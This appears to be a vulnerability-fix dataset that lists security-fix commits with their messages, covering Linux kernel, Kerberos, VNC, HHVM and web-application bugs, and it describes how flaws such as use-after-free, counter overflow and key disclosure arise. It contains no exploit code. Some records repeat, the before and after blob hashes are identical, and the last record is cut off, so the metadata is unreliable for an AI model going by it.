ALSA: control: Don't access controls outside of protected regions\n\nA control that is visible on the card->controls list can be freed at any time. This means we must not access any of its memory while not holding the controls_rw_lock. Otherwise we risk a use after free access.\n\nSigned-off-by: Lars-Peter Clausen <lars@metafoo.de> Acked-by: Jaroslav Kysela <perex@perex.cz> Cc: <stable@vger.kernel.org> Signed-off-by: Takashi Iwai <tiwai@suse.de>

======================================================================
Commit With Fix: 
    82262a46627bebb0febcc26664746c25cef08563
File(s) In Commit: 
    sound/core/control.c
Blob(s) In Commit: 
    1f413c2865113dc36fa76101e1401889626154e3
Blob(s) Before Fix: 
    1f413c2865113dc36fa76101e1401889626154e3
Projects:
    0-T-0_ps4-linux
Commit Message for 82262a46627bebb0febcc26664746c25cef08563:
ALSA: control: Fix replacing user controls\n\nThere are two issues with the current implementation for replacing user controls. The first is that the code does not check if the control is actually a user control and neither does it check if the control is owned by the process that tries to remove it. That allows userspace applications to remove arbitrary controls, which can cause a user after free if a for example a driver does not expect a control to be removed from under its feed.\n\nThe second issue is that on one hand when a control is replaced the user_ctl_count limit is not checked and on the other hand the user_ctl_count is increased (even though the number of user controls does not change). This allows userspace, once the user_ctl_count limit as been reached, to repeatedly replace a control until user_ctl_count overflows. Once that happens new controls can be added effectively bypassing the user_ctl_count limit.\n\nBoth issues can be fixed by instead of open-coding the removal of the control that is to be replaced to use snd_ctl_remove_user_ctl(). This function does proper permission checks as well as decrements user_ctl_count after the control has been removed.\n\nNote that by using snd_ctl_remove_user_ctl() the check which returns -EBUSY at beginning of the function if the control already exists is removed. This is not a problem though since the check is quite useless, because the lock that is protecting the control list is released between the check and before adding the new control to the list, which means that it is possible that a different control with the same settings is added to the list after the check. Luckily there is another check that is done while holding the lock in snd_ctl_add(), so we'll rely on that to make sure that the same control is not added twice.\n\nSigned-off-by: Lars-Peter Clausen <lars@metafoo.de> Acked-by: Jaroslav Kysela <perex@perex.cz> Cc: <stable@vger.kernel.org> Signed-off-by: Takashi Iwai <tiwai@suse.de>

======================================================================
Commit With Fix: 
    82262a46627bebb0febcc26664746c25cef08563
File(s) In Commit: 
    sound/core/control.c
Blob(s) In Commit: 
    1f413c2865113dc36fa76101e1401889626154e3
Blob(s) Before Fix: 
    1f413c2865113dc36fa76101e1401889626154e3
Projects:
    0-T-0_ps4-linux
Commit Message for 82262a46627bebb0febcc26664746c25cef08563:
ALSA: control: Fix replacing user controls\n\nThere are two issues with the current implementation for replacing user controls. The first is that the code does not check if the control is actually a user control and neither does it check if the control is owned by the process that tries to remove it. That allows userspace applications to remove arbitrary controls, which can cause a user after free if a for example a driver does not expect a control to be removed from under its feed.\n\nThe second issue is that on one hand when a control is replaced the user_ctl_count limit is not checked and on the other hand the user_ctl_count is increased (even though the number of user controls does not change). This allows userspace, once the user_ctl_count limit as been reached, to repeatedly replace a control until user_ctl_count overflows. Once that happens new controls can be added effectively bypassing the user_ctl_count limit.\n\nBoth issues can be fixed by instead of open-coding the removal of the control that is to be replaced to use snd_ctl_remove_user_ctl(). This function does proper permission checks as well as decrements user_ctl_count after the control has been removed.\n\nNote that by using snd_ctl_remove_user_ctl() the check which returns -EBUSY at beginning of the function if the control already exists is removed. This is not a problem though since the check is quite useless, because the lock that is protecting the control list is released between the check and before adding the new control to the list, which means that it is possible that a different control with the same settings is added to the list after the check. Luckily there is another check that is done while holding the lock in snd_ctl_add(), so we'll rely on that to make sure that the same control is not added twice.\n\nSigned-off-by: Lars-Peter Clausen <lars@metafoo.de> Acked-by: Jaroslav Kysela <perex@perex.cz> Cc: <stable@vger.kernel.org> Signed-off-by: Takashi Iwai <tiwai@suse.de>

======================================================================
Commit With Fix: 
    d3217b15a19a4779c39b212358a5c71d725822ee
File(s) In Commit: 
    net/sctp/associola.c
Blob(s) In Commit: 
    9de23a222d3f7b9f33e650483d749d3341c51dc0
Blob(s) Before Fix: 
    9de23a222d3f7b9f33e650483d749d3341c51dc0
Projects:
    0-T-0_ps4-linux
Commit Message for d3217b15a19a4779c39b212358a5c71d725822ee:
sctp: Fix sk_ack_backlog wrap-around problem\n\nConsider the scenario: For a TCP-style socket, while processing the COOKIE_ECHO chunk in sctp_sf_do_5_1D_ce(), after it has passed a series of sanity check, a new association would be created in sctp_unpack_cookie(), but afterwards, some processing maybe failed, and sctp_association_free() will be called to free the previously allocated association, in sctp_association_free(), sk_ack_backlog value is decremented for this socket, since the initial value for sk_ack_backlog is 0, after the decrement, it will be 65535, a wrap-around problem happens, and if we want to establish new associations afterward in the same socket, ABORT would be triggered since sctp deem the accept queue as full. Fix this issue by only decrementing sk_ack_backlog for associations in the endpoint's list.\n\nFix-suggested-by: Neil Horman <nhorman@tuxdriver.com> Signed-off-by: Xufeng Zhang <xufeng.zhang@windriver.com> Acked-by: Daniel Borkmann <dborkman@redhat.com> Acked-by: Vlad Yasevich <vyasevich@gmail.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    fbda667221c51f0aa476a02366e0cf66cb012f88
File(s) In Commit: 
    cherokee/validator_ldap.c
Blob(s) In Commit: 
    417fd9e4bc44b50c98e90e1aeeaa0022cf56b960
Blob(s) Before Fix: 
    417fd9e4bc44b50c98e90e1aeeaa0022cf56b960
Projects:
    13xforever_webserver
Commit Message for fbda667221c51f0aa476a02366e0cf66cb012f88:
Prevent the LDAP validator from accepting an empty password.

======================================================================
Commit With Fix: 
    f80e417bb3e7ab5c1a89ea9ddd2cd060f54464e1
File(s) In Commit: 
    e107_admin/db.php
Blob(s) In Commit: 
    1c76ef1774086130157c24f47488b90945562f62
Blob(s) Before Fix: 
    1c76ef1774086130157c24f47488b90945562f62
Projects:
    Alex-e107nl_e107
Commit Message for f80e417bb3e7ab5c1a89ea9ddd2cd060f54464e1:
Sanitize some request variables

======================================================================
Commit With Fix: 
    8f1b18150cc2a8f27c96d9c4f94a81022fbb61e3
File(s) In Commit: 
    module_system/system/class_link.php
Blob(s) In Commit: 
    4badfcae6b1b89d7d872b92395a51e7ff7d07ec3
Blob(s) Before Fix: 
    4badfcae6b1b89d7d872b92395a51e7ff7d07ec3
Projects:
    artemeon_core
Commit Message for 8f1b18150cc2a8f27c96d9c4f94a81022fbb61e3:
BUG / SECURITY: module_system | class_link -> fixed some rare conditions where a possible xss injection was possible for the systemid-param

======================================================================
Commit With Fix: 
    d202ef3def8674be61a3e4ccbe28beba4953b7ce
File(s) In Commit: 
    odm-init.php
Blob(s) In Commit: 
    1ee73f12dae818e5e3ccd1fa171911910cdb8420
Blob(s) Before Fix: 
    1ee73f12dae818e5e3ccd1fa171911910cdb8420
Projects:
    AYCHIM_ISOManage.Aych.io
Commit Message for d202ef3def8674be61a3e4ccbe28beba4953b7ce:
issue163 - xss issue with files

======================================================================
Commit With Fix: 
    3cf521f7dc87c031617fd47e4b7aa2593c2f3daf
File(s) In Commit: 
    net/l2tp/l2tp_ppp.c
Blob(s) In Commit: 
    13752d96275e8b9142539a201ea1ac6f45f883ba
Blob(s) Before Fix: 
    13752d96275e8b9142539a201ea1ac6f45f883ba
Projects:
    0-T-0_ps4-linux
Commit Message for 3cf521f7dc87c031617fd47e4b7aa2593c2f3daf:
net/l2tp: don't fall back on UDP [get|set]sockopt\n\nThe l2tp [get|set]sockopt() code has fallen back to the UDP functions for socket option levels != SOL_PPPOL2TP since day one, but that has never actually worked, since the l2tp socket isn't an inet socket.\n\nAs David Miller points out:\n\n  "If we wanted this to work, it'd have to look up the tunnel and then    use tunnel->sk, but I wonder how useful that would be"\n\nSince this can never have worked so nobody could possibly have depended on that functionality, just remove the broken code and return -EINVAL.\n\nReported-by: Sasha Levin <sasha.levin@oracle.com> Acked-by: James Chapman <jchapman@katalix.com> Acked-by: David Miller <davem@davemloft.net> Cc: Phil Turnbull <phil.turnbull@oracle.com> Cc: Vegard Nossum <vegard.nossum@oracle.com> Cc: Willy Tarreau <w@1wt.eu> Cc: stable@vger.kernel.org Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    9c2cd3c93c05d009a91d84eedbb85873b0cb505d
File(s) In Commit: 
    librawstudio/rs-filter.c
Blob(s) In Commit: 
    352b23c51a00b32c4993732b1534ff5a988ee763
Blob(s) Before Fix: 
    352b23c51a00b32c4993732b1534ff5a988ee763
Projects:
    giallu_rawstudio
Commit Message for 9c2cd3c93c05d009a91d84eedbb85873b0cb505d:
Fixes insecure use of temporary file (CVE-2014-4978).

======================================================================
Commit With Fix: 
    9938bcd1df8ea27052557c722a67b00c0e7d6cb6
File(s) In Commit: 
    application/controllers/admin/participantsaction.php
Blob(s) In Commit: 
    e6cef23fec75bf00e6b4368d82d2217a4a5cfdd4
Blob(s) Before Fix: 
    e6cef23fec75bf00e6b4368d82d2217a4a5cfdd4
Projects:
    3limin4t0r_LimeSurvey
Commit Message for 9938bcd1df8ea27052557c722a67b00c0e7d6cb6:
Fixed issue: Search parameter vulnerability in CPDB

======================================================================
Commit With Fix: 
    295dc39d941dc2ae53d5c170365af4c9d5c16212
File(s) In Commit: 
    fs/namei.c
Blob(s) In Commit: 
    9eb787e5c167fb601845590f0181d249bf515fb0
Blob(s) Before Fix: 
    9eb787e5c167fb601845590f0181d249bf515fb0
Projects:
    0-T-0_ps4-linux
Commit Message for 295dc39d941dc2ae53d5c170365af4c9d5c16212:
fs: umount on symlink leaks mnt count\n\nCurrently umount on symlink blocks following umount:\n\n/vz is separate mount\n\n# ls /vz/ -al | grep test drwxr-xr-x.  2 root root       4096 Jul 19 01:14 testdir lrwxrwxrwx.  1 root root         11 Jul 19 01:16 testlink -> /vz/testdir # umount -l /vz/testlink umount: /vz/testlink: not mounted (expected)\n\n# lsof /vz # umount /vz umount: /vz: device is busy. (unexpected)\n\nIn this case mountpoint_last() gets an extra refcount on path->mnt\n\nSigned-off-by: Vasily Averin <vvs@openvz.org> Acked-by: Ian Kent <raven@themaw.net> Acked-by: Jeff Layton <jlayton@primarydata.com> Cc: stable@vger.kernel.org Signed-off-by: Christoph Hellwig <hch@lst.de>

======================================================================
Commit With Fix: 
    1be9a950c646c9092fb3618197f7b6bfb50e82aa
File(s) In Commit: 
    net/sctp/associola.c
Blob(s) In Commit: 
    06a9ee6b2d3a577a73b62028a711f5f801fe13f0
Blob(s) Before Fix: 
    06a9ee6b2d3a577a73b62028a711f5f801fe13f0
Projects:
    0-T-0_ps4-linux
Commit Message for 1be9a950c646c9092fb3618197f7b6bfb50e82aa:
net: sctp: inherit auth_capable on INIT collisions\n\nJason reported an oops caused by SCTP on his ARM machine with SCTP authentication enabled:\n\nInternal error: Oops: 17 [#1] ARM CPU: 0 PID: 104 Comm: sctp-test Not tainted 3.13.0-68744-g3632f30c9b20-dirty #1 task: c6eefa40 ti: c6f52000 task.ti: c6f52000 PC is at sctp_auth_calculate_hmac+0xc4/0x10c LR is at sg_init_table+0x20/0x38 pc : [<c024bb80>]    lr : [<c00f32dc>]    psr: 40000013 sp : c6f538e8  ip : 00000000  fp : c6f53924 r10: c6f50d80  r9 : 00000000  r8 : 00010000 r7 : 00000000  r6 : c7be4000  r5 : 00000000  r4 : c6f56254 r3 : c00c8170  r2 : 00000001  r1 : 00000008  r0 : c6f1e660 Flags: nZcv  IRQs on  FIQs on  Mode SVC_32  ISA ARM  Segment user Control: 0005397f  Table: 06f28000  DAC: 00000015 Process sctp-test (pid: 104, stack limit = 0xc6f521c0) Stack: (0xc6f538e8 to 0xc6f54000) [...] Backtrace: [<c024babc>] (sctp_auth_calculate_hmac+0x0/0x10c) from [<c0249af8>] (sctp_packet_transmit+0x33c/0x5c8) [<c02497bc>] (sctp_packet_transmit+0x0/0x5c8) from [<c023e96c>] (sctp_outq_flush+0x7fc/0x844) [<c023e170>] (sctp_outq_flush+0x0/0x844) from [<c023ef78>] (sctp_outq_uncork+0x24/0x28) [<c023ef54>] (sctp_outq_uncork+0x0/0x28) from [<c0234364>] (sctp_side_effects+0x1134/0x1220) [<c0233230>] (sctp_side_effects+0x0/0x1220) from [<c02330b0>] (sctp_do_sm+0xac/0xd4) [<c0233004>] (sctp_do_sm+0x0/0xd4) from [<c023675c>] (sctp_assoc_bh_rcv+0x118/0x160) [<c0236644>] (sctp_assoc_bh_rcv+0x0/0x160) from [<c023d5bc>] (sctp_inq_push+0x6c/0x74) [<c023d550>] (sctp_inq_push+0x0/0x74) from [<c024a6b0>] (sctp_rcv+0x7d8/0x888)\n\nWhile we already had various kind of bugs in that area ec0223ec48a9 ("net: sctp: fix sctp_sf_do_5_1D_ce to verify if we/peer is AUTH capable") and b14878ccb7fa ("net: sctp: cache auth_enable per endpoint"), this one is a bit of a different kind.\n\nGiving a bit more background on why SCTP authentication is needed can be found in RFC4895:\n\n  SCTP uses 32-bit verification tags to protect itself against   blind attackers. These values are not changed during the   lifetime of an SCTP association.\n\n  Looking at new SCTP extensions, there is the need to have a   method of proving that an SCTP chunk(s) was really sent by   the original peer that started the association and not by a   malicious attacker.\n\nTo cause this bug, we're triggering an INIT collision between peers  normal SCTP handshake where both sides intent to authenticate packets contains RANDOM  CHUNKS  HMAC-ALGO parameters that are being negotiated among peers:\n\n  ---------- INIT[RANDOM  CHUNKS  HMAC-ALGO] ---------->   <------- INIT-ACK[RANDOM  CHUNKS  HMAC-ALGO] ---------   -------------------- COOKIE-ECHO -------------------->   <-------------------- COOKIE-ACK ---------------------\n\nRFC4895 says that each endpoint therefore knows its own random number and the peer's random number *after* the association has been established. The local and peer's random number along with the shared key are then part of the secret used for calculating the HMAC in the AUTH chunk.\n\nNow, in our scenario, we have 2 threads with 1 non-blocking SEQ_PACKET socket each, setting up common shared SCTP_AUTH_KEY and SCTP_AUTH_ACTIVE_KEY properly, and each of them calling sctp_bindx(3), listen(2) and connect(2) against each other, thus the handshake looks similar to this, e.g.:\n\n  ---------- INIT[RANDOM  CHUNKS  HMAC-ALGO] ---------->   <------- INIT-ACK[RANDOM  CHUNKS  HMAC-ALGO] ---------   <--------- INIT[RANDOM  CHUNKS  HMAC-ALGO] -----------   -------- INIT-ACK[RANDOM  CHUNKS  HMAC-ALGO] -------->   ...\n\nSince such collisions can also happen with verification tags, the RFC4895 for AUTH rather vaguely says under section 6.1:\n\n  In case of INIT collision, the rules governing the handling   of this Random Number follow the same pattern as those for   the Verification Tag, as explained in Section 5.2.4 of   RFC 2960 [5]. Therefore, each endpoint knows its own Random   Number and the peer's Random Number after the association   has been established.\n\nIn RFC2960, section 5.2.4, we're eventually hitting Action B:\n\n  B) In this case, both sides may be attempting to start an      association at about the same time but the peer endpoint      started its INIT after responding to the local endpoint's      INIT. Thus it may have picked a new Verification Tag not      being aware of the previous Tag it had sent this endpoint.      The endpoint should stay in or enter the ESTABLISHED      state but it MUST update its peer's Verification Tag from      the State Cookie, stop any init or cookie timers that may      running and send a COOKIE ACK.\n\nIn other words, the handling of the Random parameter is the same as behavior for the Verification Tag as described in Action B of section 5.2.4.\n\nLooking at the code, we exactly hit the sctp_sf_do_dupcook_b() case which triggers an SCTP_CMD_UPDATE_ASSOC command to the side effect interpreter, and in fact it properly copies over peer_{random, hmacs, chunks} parameters from the newly created association to update the existing one.\n\nAlso, the old asoc_shared_key is being released and based on the new params, sctp_auth_asoc_init_active_key() updated. However, the issue observed in this case is that the previous asoc->peer.auth_capable was 0, and has *not* been updated, so that instead of creating a new secret, we're doing an early return from the function sctp_auth_asoc_init_active_key() leaving asoc->asoc_shared_key as NULL. However, we now have to authenticate chunks from the updated chunk list (e.g. COOKIE-ACK).\n\nThat in fact causes the server side when responding with ...\n\n  <------------------ AUTH  COOKIE-ACK -----------------\n\n... to trigger a NULL pointer dereference, since in sctp_packet_transmit(), it discovers that an AUTH chunk is being queued for xmit, and thus it calls sctp_auth_calculate_hmac().\n\nSince the asoc->active_key_id is still inherited from the endpoint, and the same as encoded into the chunk, it uses asoc->asoc_shared_key, which is still NULL, as an asoc_key and dereferences it in ...\n\n  crypto_hash_setkey(desc.tfm, &asoc_key->data[0], asoc_key->len)\n\n... causing an oops. All this happens because sctp_make_cookie_ack() called with the *new* association has the peer.auth_capable=1 and therefore marks the chunk with auth=1 after checking sctp_auth_send_cid(), but it is *actually* sent later on over the then *updated* association's transport that didn't initialize its shared key due to peer.auth_capable=0. Since control chunks in that case are not sent by the temporary association which are scheduled for deletion, they are issued for xmit via SCTP_CMD_REPLY in the interpreter with the context of the *updated* association. peer.auth_capable was 0 in the updated association (which went from COOKIE_WAIT into ESTABLISHED state), since all previous processing that performed sctp_process_init() was being done on temporary associations, that we eventually throw away each time.\n\nThe correct fix is to update to the new peer.auth_capable value as well in the collision case via sctp_assoc_update(), so that in case the collision migrated from 0 -> 1, sctp_auth_asoc_init_active_key() can properly recalculate the secret. This therefore fixes the observed server panic.\n\nFixes: 730fc3d05cd4 ("[SCTP]: Implete SCTP-AUTH parameter processing") Reported-by: Jason Gunthorpe <jgunthorpe@obsidianresearch.com> Signed-off-by: Daniel Borkmann <dborkman@redhat.com> Tested-by: Jason Gunthorpe <jgunthorpe@obsidianresearch.com> Cc: Vlad Yasevich <vyasevich@gmail.com> Acked-by: Vlad Yasevich <vyasevich@gmail.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    530af9cb8e700e7596b3ec812bad123c9fa06356
File(s) In Commit: 
    deps/v8/src/isolate.h
Blob(s) In Commit: 
    2769ca7c9ac4da6a6ffd52a416ffb5c42a4a4f7b
Blob(s) Before Fix: 
    2769ca7c9ac4da6a6ffd52a416ffb5c42a4a4f7b
Projects:
    0-Captain_node
Commit Message for 530af9cb8e700e7596b3ec812bad123c9fa06356:
v8: Interrupts must not mask stack overflow.\n\nBackport of https://codereview.chromium.org/339883002

======================================================================
Commit With Fix: 
    af0ed4df4dfae762ab5fb605f5a0c8f59cb4f6ca
File(s) In Commit: 
    src/lib/kadm5/srv/svr_principal.c
Blob(s) In Commit: 
    d4e74cc267f441c52f99377a98ae852e4b2df14b
Blob(s) Before Fix: 
    d4e74cc267f441c52f99377a98ae852e4b2df14b
Projects:
    3van_krb5
Commit Message for af0ed4df4dfae762ab5fb605f5a0c8f59cb4f6ca:
Return only new keys in randkey [CVE-2014-5351]\n\nIn kadmind's randkey operation, if a client specifies the keepold flag, do not include the preserved old keys in the response.\n\nCVE-2014-5351:\n\nAn authenticated remote attacker can retrieve the current keys for a service principal when generating a new set of keys for that principal.  The attacker needs to be authenticated as a user who has the elevated privilege for randomizing the keys of other principals.\n\nNormally, when a Kerberos administrator randomizes the keys of a service principal, kadmind returns only the new keys.  This prevents an administrator who lacks legitimate privileged access to a service from forging tickets to authenticate to that service.  If the "keepold" flag to the kadmin randkey RPC operation is true, kadmind retains the old keys in the KDC database as intended, but also unexpectedly returns the old keys to the client, which exposes the service to ticket forgery attacks from the administrator.\n\nA mitigating factor is that legitimate clients of the affected service will start failing to authenticate to the service once they begin to receive service tickets encrypted in the new keys.  The affected service will be unable to decrypt the newly issued tickets, possibly alerting the legitimate administrator of the affected service.\n\nCVSSv2: AV:N/AC:H/Au:S/C:P/I:N/A:N/E:POC/RL:OF/RC:C\n\n[tlyu@mit.edu: CVE description and CVSS score]\n\nticket: 8018 (new) target_version: 1.13 tags: pullup

======================================================================
Commit With Fix: 
    d1f707024f1d0af6e54a18885322d70fa15ec4d3
File(s) In Commit: 
    src/plugins/kdb/ldap/libkdb_ldap/ldap_pwd_policy.c
Blob(s) In Commit: 
    6779f51c7bf93249a47a30f95d4e32a4b05444b0
Blob(s) Before Fix: 
    6779f51c7bf93249a47a30f95d4e32a4b05444b0
Projects:
    3van_krb5
Commit Message for d1f707024f1d0af6e54a18885322d70fa15ec4d3:
Fix LDAP misused policy name crash [CVE-2014-5353]\n\nIn krb5_ldap_get_password_policy_from_dn, if LDAP_SEARCH returns successfully with no results, return KRB5_KDB_NOENTRY instead of returning success with a zeroed-out policy object.  This fixes a null dereference when an admin attempts to use an LDAP ticket policy name as a password policy name.\n\nCVE-2014-5353:\n\nIn MIT krb5, when kadmind is configured to use LDAP for the KDC database, an authenticated remote attacker can cause a NULL dereference by attempting to use a named ticket policy object as a password policy for a principal.  The attacker needs to be authenticated as a user who has the elevated privilege for setting password policy by adding or modifying principals.\n\nQueries to LDAP scoped to the krbPwdPolicy object class will correctly not return entries of other classes, such as ticket policy objects, but may return success with no returned elements if an object with the requested DN exists in a different object class.  In this case, the routine to retrieve a password policy returned success with a password policy object that consisted entirely of zeroed memory.  In particular, accesses to the policy name will dereference a NULL pointer.  KDC operation does not access the policy name field, but most kadmin operations involving the principal with incorrect password policy will trigger the crash.\n\nThanks to Patrik Kis for reporting this problem.\n\nCVSSv2 Vector: AV:N/AC:M/Au:S/C:N/I:N/A:C/E:H/RL:OF/RC:C\n\n[kaduk@mit.edu: CVE description and CVSS score]\n\nticket: 8051 (new) target_version: 1.13.1 tags: pullup

======================================================================
Commit With Fix: 
    04038bf3633c4b909b5ded3072dc88c8c419bf16
File(s) In Commit: 
    src/plugins/kdb/ldap/libkdb_ldap/ldap_principal2.c
Blob(s) In Commit: 
    10b5982f164ac3ad8235c19b2081ef21ae942a6a
Blob(s) Before Fix: 
    10b5982f164ac3ad8235c19b2081ef21ae942a6a
Projects:
    3van_krb5
Commit Message for 04038bf3633c4b909b5ded3072dc88c8c419bf16:
Support keyless principals in LDAP [CVE-2014-5354]\n\nOperations like "kadmin -q 'addprinc -nokey foo'" or "kadmin -q 'purgekeys -all foo'" result in principal entries with no keys present, so krb5_encode_krbsecretkey() would just return NULL, which then got unconditionally dereferenced in krb5_add_ber_mem_ldap_mod().\n\nApply some fixes to krb5_encode_krbsecretkey() to handle zero-key principals better, correct the test for an allocation failure, and slightly restructure the cleanup handler to be shorter and more appropriate for the usage.  Once it no longer short-circuits when n_key_data is zero, it will produce an array of length two with both entries NULL, which is treated as an empty list by the LDAP library, the correct behavior for a keyless principal.\n\nHowever, attributes with empty values are only handled by the LDAP library for Modify operations, not Add operations (which only get a sequence of Attribute, with no operation field).  Therefore, only add an empty krbprincipalkey to the modlist when we will be performing a Modify, and not when we will be performing an Add, which is conditional on the (misspelled) create_standalone_prinicipal boolean.\n\nCVE-2014-5354:\n\nIn MIT krb5, when kadmind is configured to use LDAP for the KDC database, an authenticated remote attacker can cause a NULL dereference by inserting into the database a principal entry which contains no long-term keys.\n\nIn order for the LDAP KDC backend to translate a principal entry from the database abstraction layer into the form expected by the LDAP schema, the principal's keys are encoded into a NULL-terminated array of length-value entries to be stored in the LDAP database.  However, the subroutine which produced this array did not correctly handle the case where no keys were present, returning NULL instead of an empty array, and the array was unconditionally dereferenced while adding to the list of LDAP operations to perform.\n\nVersions of MIT krb5 prior to 1.12 did not expose a way for principal entries to have no long-term key material, and therefore are not vulnerable.\n\n    CVSSv2 Vector: AV:N/AC:M/Au:S/C:N/I:N/A:P/E:H/RL:OF/RC:C\n\nticket: 8041 (new) tags: pullup target_version: 1.13.1 subject: kadmind with ldap backend crashes when putting keyless entries

======================================================================
Commit With Fix: 
    ab6fdeb84fb090b48606b6f7933028cfe7bf3a5e
File(s) In Commit: 
    hphp/runtime/ext/mcrypt/ext_mcrypt.cpp
Blob(s) In Commit: 
    0dc3ae5d9ee6a0095ed2cb363171a4310f130903
Blob(s) Before Fix: 
    0dc3ae5d9ee6a0095ed2cb363171a4310f130903
Projects:
    10000TB_hhvm
Commit Message for ab6fdeb84fb090b48606b6f7933028cfe7bf3a5e:
Fix mcrypt_create_iv(..., MCRYPT_RAND) to auto-seed RNG\n\nSummary: Without seeding the random number generator, we'll always get the same IV, and that reduces the security of this function.\n\nFortunately, f_rand() has all of that logic for auto-seeding and selection of a suitable initial seed built-in.\n\nRealistically, using MCRYPT_RAND should be deprecated. I'm going to wait on PHP Internals to make a decision on https://wiki.php.net/rfc/deprecate_mcrypt_rand before adding that warning however, so that our test suite remains consistent.\n\nCredit: Theodore R. Smith of PHP Experts, Inc. <theodorephpexperts.pro>\n\nCloses #3496\n\nReviewed By: @ptarjan\n\nDifferential Revision: D1502435

======================================================================
Commit With Fix: 
    95464495f1e3e714d5c295fe621af5d2e0d4238d
File(s) In Commit: 
    app/views/layouts/application.html.haml
Blob(s) In Commit: 
    1b8d8c0384caab9bfbebe3fcce27816754bc24b4
Blob(s) Before Fix: 
    1b8d8c0384caab9bfbebe3fcce27816754bc24b4
Projects:
    0bserver07_fat_free_crm
Commit Message for 95464495f1e3e714d5c295fe621af5d2e0d4238d:
json_escape user input

======================================================================
Commit With Fix: 
    045a044e8ae79db9244593fbce154cdf6e843273
File(s) In Commit: 
    libvncclient/vncviewer.c
Blob(s) In Commit: 
    24bc6f8938d065105956ca79dcf87d59ab6cf351
Blob(s) Before Fix: 
    24bc6f8938d065105956ca79dcf87d59ab6cf351
Projects:
    22MILES_libvncserver
Commit Message for 045a044e8ae79db9244593fbce154cdf6e843273:
Fix integer overflow in MallocFrameBuffer()\n\nPromote integers to uint64_t to avoid integer overflow issue during frame buffer allocation for very large screen sizes

======================================================================
Commit With Fix: 
    6037a9074d52b1963c97cb28ea1096c7c14cbf28
File(s) In Commit: 
    libvncserver/rfbserver.c
Blob(s) In Commit: 
    7e43fe3f9c7b639a1d919664b5c483bb771d95ce
Blob(s) Before Fix: 
    7e43fe3f9c7b639a1d919664b5c483bb771d95ce
Projects:
    22MILES_libvncserver
Commit Message for 6037a9074d52b1963c97cb28ea1096c7c14cbf28:
Check malloc() return value on client->server ClientCutText message. Client can send up to 2**32-1 bytes of text, and such a large allocation is likely to fail in case of high memory pressure. This would in a server crash (write at address 0).

======================================================================
Commit With Fix: 
    05a9bd41a8ec0a9d580a8f420f41718bdd235446
File(s) In Commit: 
    libvncserver/rfbserver.c
Blob(s) In Commit: 
    df7d74c760031f65186e1e8affcfa95ef4397bc3
Blob(s) Before Fix: 
    df7d74c760031f65186e1e8affcfa95ef4397bc3
Projects:
    22MILES_libvncserver
Commit Message for 05a9bd41a8ec0a9d580a8f420f41718bdd235446:
Do not accept a scaling factor of zero on PalmVNCSetScaleFactor and SetScale client->server messages. This would cause a division by zero and crash the server.

======================================================================
Commit With Fix: 
    7135ec229882370a00411aa50030eada6034cc1b
File(s) In Commit: 
    hphp/runtime/ext/ext_hash.cpp
Blob(s) In Commit: 
    cd55297c5319b7156f3dc22f83c190fa806ebe37
Blob(s) Before Fix: 
    cd55297c5319b7156f3dc22f83c190fa806ebe37
Projects:
    10000TB_hhvm
Commit Message for 7135ec229882370a00411aa50030eada6034cc1b:
Fix potential security leak in HashContext\n\nSummary: CVE-2014-6229\n\nThis is not a NUL-terminated string, it's a fixed-size block of data. The risks were key truncation (if there happens to be a NUL byte in the key) or over-reading (which would be information leakage).\n\nReviewed By: @ptarjan\n\nDifferential Revision: D1533546

======================================================================
Commit With Fix: 
    e3abe7d7585ecc420a7cab73313216613aadad5a
File(s) In Commit: 
    src/dissectors/ec_postgresql.c
Blob(s) In Commit: 
    95bf55270d7da92a53a263f1366a6393397894b1
Blob(s) Before Fix: 
    95bf55270d7da92a53a263f1366a6393397894b1
Projects:
    0x0mar_ettercap
Commit Message for e3abe7d7585ecc420a7cab73313216613aadad5a:
Fixed heap overflow caused by length

======================================================================
Commit With Fix: 
    e3abe7d7585ecc420a7cab73313216613aadad5a
File(s) In Commit: 
    src/dissectors/ec_postgresql.c
Blob(s) In Commit: 
    95bf55270d7da92a53a263f1366a6393397894b1
Blob(s) Before Fix: 
    95bf55270d7da92a53a263f1366a6393397894b1
Projects:
    0x0mar_ettercap
Commit Message for e3abe7d7585ecc420a7cab73313216613aadad5a:
Fixed heap overflow caused by length

======================================================================
Commit With Fix: 
    c03aa9f6e1f938618e6db2e23afef0574efeeb65
File(s) In Commit: 
    fs/udf/inode.c
Blob(s) In Commit: 
    a6a40536ebf139c018d1622acfea80fd52d8f5ae
Blob(s) Before Fix: 
    a6a40536ebf139c018d1622acfea80fd52d8f5ae
Projects:
    0-T-0_ps4-linux
Commit Message for c03aa9f6e1f938618e6db2e23afef0574efeeb65:
udf: Avoid infinite loop when processing indirect ICBs\n\nWe did not implement any bound on number of indirect ICBs we follow when loading inode. Thus corrupted medium could cause kernel to go into an infinite loop, possibly causing a stack overflow.\n\nFix the possible stack overflow by removing recursion from __udf_read_inode() and limit number of indirect ICBs we follow to avoid infinite loops.\n\nSigned-off-by: Jan Kara <jack@suse.cz>

======================================================================
Commit With Fix: 
    c27a3e4d667fdcad3db7b104f75659478e0c68d8
File(s) In Commit: 
    net/ceph/auth_x.c
Blob(s) In Commit: 
    de6662b14e1f5d7110ac1316c1362e4db6bffc5f
Blob(s) Before Fix: 
    de6662b14e1f5d7110ac1316c1362e4db6bffc5f
Projects:
    0-T-0_ps4-linux
Commit Message for c27a3e4d667fdcad3db7b104f75659478e0c68d8:
libceph: do not hard code max auth ticket len\n\nWe hard code cephx auth ticket buffer size to 256 bytes.  This isn't enough for any moderate setups and, in case tickets themselves are not encrypted, leads to buffer overflows (ceph_x_decrypt() errors out, but ceph_decode_copy() doesn't - it's just a memcpy() wrapper).  Since the buffer is allocated dynamically anyway, allocated it a bit later, at the point where we know how much is going to be needed.\n\nFixes: http://tracker.ceph.com/issues/8979\n\nCc: stable@vger.kernel.org Signed-off-by: Ilya Dryomov <ilya.dryomov@inktank.com> Reviewed-by: Sage Weil <sage@redhat.com>

======================================================================
Commit With Fix: 
    c27a3e4d667fdcad3db7b104f75659478e0c68d8
File(s) In Commit: 
    net/ceph/auth_x.c
Blob(s) In Commit: 
    de6662b14e1f5d7110ac1316c1362e4db6bffc5f
Blob(s) Before Fix: 
    de6662b14e1f5d7110ac1316c1362e4db6bffc5f
Projects:
    0-T-0_ps4-linux
Commit Message for c27a3e4d667fdcad3db7b104f75659478e0c68d8:
